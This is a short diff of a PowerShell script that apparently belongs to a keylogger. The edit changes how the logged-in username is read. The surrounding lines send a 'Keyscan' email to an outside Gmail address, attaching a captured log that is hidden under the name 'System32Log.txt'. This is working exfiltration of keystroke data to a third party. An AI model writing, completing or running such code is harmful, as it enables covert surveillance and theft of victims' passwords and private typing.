@@ -14,7 +14,7 @@ if($message -ne $null) {
 	$password=ConvertTo-SecureString $env:pass -AsPlainText -Force
 
 	$creds= New-Object System.Management.Automation.PSCredential ($SendAddress,$password) 
-	$user=gwmi -class Win32_ComputerSystem | select username | grep ANON | %{ $_.Split('\')[1]; }
+	$user=gwmi -class Win32_ComputerSystem | select username | grep $env:computername | %{ $_.Split('\')[1]; }
 
 	Send-MailMessage -From $SendAddress -to "brytonjherdes@gmail.com" -Subject "Keyscan" `
 	-Body " $message" -Attachments "C:\users\public\System32Log.txt" `
